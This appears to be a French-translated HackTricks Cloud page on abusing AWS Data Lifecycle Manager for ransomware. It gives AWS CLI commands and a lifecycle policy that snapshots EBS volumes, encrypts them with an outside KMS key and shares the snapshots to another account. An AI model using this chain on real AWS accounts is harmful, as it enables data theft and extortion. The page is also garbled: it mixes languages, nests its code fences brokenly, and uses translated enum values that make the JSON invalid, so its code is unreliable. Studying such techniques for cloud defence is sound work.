# AWS - Gestionnaire de cycle de vie des donn√©es

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Gestionnaire de cycle de vie des donn√©es (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Une attaque par ransomware peut √™tre ex√©cut√©e en chiffrant autant de volumes EBS que possible, puis en effa√ßant les instances EC2 actuelles, les volumes EBS et les instantan√©s. Pour automatiser cette activit√© malveillante, on peut utiliser Amazon DLM, chiffrer les instantan√©s avec une cl√© KMS d'un autre compte AWS et transf√©rer les instantan√©s chiffr√©s vers un compte diff√©rent. Alternativement, ils pourraient transf√©rer des instantan√©s sans chiffrement vers un compte qu'ils g√®rent, puis les chiffrer l√†-bas. Bien qu'il ne soit pas directement possible de chiffrer les volumes EBS ou les instantan√©s existants, il est possible de le faire en cr√©ant un nouveau volume ou instantan√©.

Tout d'abord, on utilisera une commande pour recueillir des informations sur les volumes, telles que l'ID de l'instance, l'ID du volume, l'√©tat de chiffrement, l'√©tat de l'attachement et le type de volume.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```plaintext
aws dlm create-lifecycle-policy --description "Ma premi√®re politique" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
```

A template for the policy document can be seen here:
```bash
```json
{
"PolicyType": "GESTION_DES_SNAPSHOTS_EBS",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "Cl√©Exemple",
"Value": "ValeurExemple"
}
],
"Schedules": [
{
"Name": "SnapshotsQuotidiens",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "Cr√©ateurDuSnapshot",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "CentreDeCo√ªt",
"Value": "Finance"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "HEURES",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "HEURES"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "JOURS"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "JOURS"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
